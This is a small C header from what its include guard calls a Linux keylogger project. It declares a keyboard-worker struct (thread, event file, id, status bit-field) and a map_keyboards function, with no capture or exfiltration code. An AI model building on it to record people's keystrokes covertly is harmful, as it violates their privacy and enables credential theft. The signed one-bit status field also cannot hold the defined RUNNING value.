/* kb_mapper.h */
#ifndef LINUX_KEYLOGGER_KB_MAPPER_H
#define LINUX_KEYLOGGER_KB_MAPPER_H

#include <stdint.h>

typedef int8_t status;

#define KB_WORKER_RUNNING 1
#define KB_WORKER_FAILED  0

struct kb_worker {
    pthread_t *kb_thread;             // The associated thread for the keyboard.
    char      *kb_event_file;         // The event file of the keyboard.
    int        kb_id;                 // The id of the current keyboard worker.
    status     kb_status: 1;          // The status of the keyboard worker.
};

extern void map_keyboards(void *arg);

#endif
